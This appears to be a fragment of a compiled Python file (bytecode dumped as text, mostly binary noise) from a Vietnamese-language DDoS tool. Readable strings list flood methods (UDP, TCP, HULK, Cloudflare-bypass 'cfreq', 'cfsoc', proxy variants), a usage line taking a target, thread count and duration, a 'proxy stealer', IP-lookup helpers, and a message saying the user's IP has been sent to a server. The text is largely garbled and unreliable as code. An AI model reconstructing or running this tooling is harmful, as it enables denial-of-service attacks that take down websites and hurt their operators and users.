        - dns                 :  Kiểm tra DNS thông thường
        - subnet              :  Kiểm tra IP
        - geiop               :  Kiểm tra vị trí IP
        - root                :  Địa chỉ IP của bạn
      ╠═════════╦═════════════════════════════════╦═════════╣
             ╦══╩═════════════════════════════════╩══╦
      �rootu   IP của bạn: {}u0   IP của bạn đã được gửi tới server.�	legendaryr�   �weakZPXCFBZppsZPPSr�   ZSPOOFZpxspoofZPXSPOOFr[   rU  rC   r9   r�   r:   r�   r;   r�   �pxrawZPXRAW�socZSOC�pxsocZPXSOC�cfreqZCFREQ� [*] �Guardsing CF... (Max 60s)
�Failed to guards cf
�cfsocZCFSOC�pxskyZPXSKY�skyZSKYZudpZUDPZtcpZTCPr�   ZMINEr�   ZVSEZhulkZHULKZcfproZCFPROZguardsZGUARDSZsupersZSUPERSZstellarZSTELLARr  ZPROXYz#Timeout proxy [seconds] (0 - all): r   z
Incorrect timeout proxy
r�   r\   zw+Zsubnetz [>] zIP r�   z+https://api.hackertarget.com/subnetcalc/?q=z;An error has occurred while sending the request to the API!Zdnsz
IP/DOMAIN z+https://api.hackertarget.com/reversedns/?q=Zgeoipz&https://api.hackertarget.com/geoip/?q=rn   z PROXY STEALER STARTED...ri   z SUCCESSFUL z UNSUCCESSFUL zproxies command Error z [z] z [!] Command not found.)Pr�  r�  r   ZXCenterr   r�  r   Zblue_to_greenr,   r�  Zgreen_to_bluer�   r�   �wmsr)   r%   r�   r�   r�   r$   Z	RESET_ALLr�   r�   r   r8   r�   r1  r�   ro   ZLaunchPXr   r'  r)  rc   r|   r}   r�   r�   r�   r�   r�   r�   r  r	  r!   r4   r"   r*   rl   r�   r<  r�  r�  rx  r�   r�   r�   r�   rX  rt  rd  r1   r�   r5   �exitrB   rC   r`   rX   r(   rD   r�   r�   r�   r�   �proxy_resourcesr�   r�   Z
HorizontalZred_to_purple)ZcmdlrY   r�   r6   r�   rS   r�   r  Zarrayr�   Zthread_listrb   r�   r�   r�   r   r   r   �welcome�  s  ���
��
�	��
��
��

�
�
�


�
*
*
*
,,�(��� � ��r�  �__main__)Zconvertr�   r{  zTMethod: legendary, px, cfreq, cfsoc, pxsky, sky, get, post, head, soc, pxraw, pxsoc
zusage:~# python3 z# <method> <target> <thread> <time>
z./resources/ua.txtrb   rR   rr   r�   r�  r�   r�  rC   r�   r�   r�  r�  r�  r�  r�  r�  r�  r�  zFailed to Guards cf
Zhttp2Zpxhttp2r�  r�  zhNo method found.
Method: legendary, weak, cfreq, cfsoc, pxsky, sky,  get, post, head, soc, pxraw, pxsoc
)r   ri   T)�r   Zasciimatics.effectsr   r   r	   Zasciimatics.renderersr
   r   r   r   Zasciimatics.scener   Zasciimatics.screenr   Zasciimatics.exceptionsr   r   r+   �	itertoolsr   ZshutilrB   rb   rj   r�   r�   ZshutupZplease�warnings�filterwarnings�simplefilterr   �cmdZpystyler   r   r   r�  �string�sysZpcpyr|   Zurllib.requestZurllib�rer   r   r   r   ZhttpxZundetected_chromedriverrv   r   r   r,  r.   r�   r  r  �catch_warnings�DeprecationWarningZurllib.parser   Zrequests.cookiesr    r!   r"   r#   r$   r%   Zflaskr&   r'   r,   r8   rW  rA   r@   rG   rV  rZ   rc   ro   r�   r`   r�   r�   r�   r�   r�   r�  r�   r�   r�   r�   r�   r�   r�   r�   r�   r�   r�   r�   r�   r�   r�   r�   r�   r�   r�   r�   r�   r�   r�   r  r	  r  r  r   r  r#  r"  r'  r&  r)  r(  r1  r.  r7  r6  r>  r<  r[  rX  rd  rb  rt  rr  rx  rw  r|  r�  r�  r�  r�  r�  r�  r�  r�  r�  r�  r�  r�  r�  �__name__r�   �argvr4   r�  r(   rm   rX   r  rU   rY   r�   r6   r�   r�   ZLaunchr�   r*   rl   ZLaunchHTTP2ZLaunchPXHTTP2r   r   r   r   �<module>   s�   "`

�
  �	)



	
	



$! 
%#�
	  
>
�

�



�

�





�
�
��